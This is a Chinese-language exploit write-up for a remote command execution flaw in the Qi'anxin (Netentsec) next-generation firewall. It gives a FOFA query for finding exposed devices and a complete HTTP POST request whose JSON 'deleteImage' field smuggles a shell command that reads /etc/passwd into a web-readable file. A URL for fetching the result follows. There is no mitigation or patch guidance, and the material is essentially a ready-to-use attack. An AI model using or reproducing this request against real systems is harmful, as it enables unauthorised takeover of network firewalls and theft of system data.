# 网康下一代防火墙-RCE

## 漏洞描述

奇安信 网康下一代防火墙存在远程命令执行，通过漏洞攻击者可以获取服务器权限

## 漏洞影响

> [!NOTE]
>
> 奇安信 网康下一代防火墙

## FOFA

> [!NOTE]
>
> app="网康科技-下一代防火墙"

## 漏洞复现

登录页面如下

![](网康下一代防火墙-RCE.assets/1627363634112111.jpg)

发送如下请求包

```
POST /directdata/direct/router HTTP/1.1
Host: XXX.XXX.XXX.XXX
Connection: close
Content-Length: 179
Cache-Control: max-age=0
sec-ch-ua: "Google Chrome";v="89", "Chromium";v="89", ";Not A Brand";v="99"
sec-ch-ua-mobile: ?0
Content-Type: application/json
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9

{"action":"SSLVPN_Resource","method":"deleteImage","data":[{"data":["/var/www/html/d.txt;cat /etc/passwd >/var/www/html/test_cmd.txt"]}],"type":"rpc","tid":17,"f8839p7rqtj":"="}

```

再请求获取命令执行结果

```
http://xxx.xxx.xxx.xxxx/test_cmd.txt
```

![](网康下一代防火墙-RCE.assets/16273636345699909.jpg)

## Goby & POC

![](网康下一代防火墙-RCE.assets/1627363634996844.jpg)